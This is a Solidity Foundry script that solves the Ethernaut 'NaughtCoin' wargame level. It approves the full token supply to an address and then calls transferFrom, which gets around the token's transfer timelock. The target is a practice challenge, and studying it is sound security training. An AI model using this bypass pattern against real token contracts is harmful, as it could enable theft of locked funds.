// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {NaughtCoin} from "../../src/Ethernaut/NaughtCoin.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        NaughtCoin naughtCoin = NaughtCoin(
            0x0E6Eb6691AAbFc9b8D8CE1E4B9D8640034Ed9C29
        );
        naughtCoin.approve(
            0xB3D6fac08D421164A414970D5225845b3A91F33F,
            naughtCoin.INITIAL_SUPPLY()
        );
        naughtCoin.transferFrom(
            0xB3D6fac08D421164A414970D5225845b3A91F33F,
            address(0x0E6Eb6691AAbFc9b8D8CE1E4B9D8640034Ed9C29),
            naughtCoin.INITIAL_SUPPLY()
        );
        vm.stopBroadcast();
    }
}
